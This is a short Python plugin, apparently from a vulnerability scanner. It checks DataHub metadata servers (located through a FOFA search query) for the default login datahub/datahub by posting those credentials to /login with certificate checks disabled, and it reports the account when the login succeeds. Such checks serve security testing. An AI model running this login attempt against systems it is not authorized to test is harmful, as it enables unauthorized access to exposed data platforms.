#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'DataHub Metadata - Default Login',

      'level'     :   'high',

      'FOFA'      :   'title="DataHub"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/login'
  data = '{"username":"datahub","password":"datahub"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "actor=urn:li:corpuser:datahub'" in res.headers:
      ret['huixian'] = '账号/密码：datahub/datahub'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret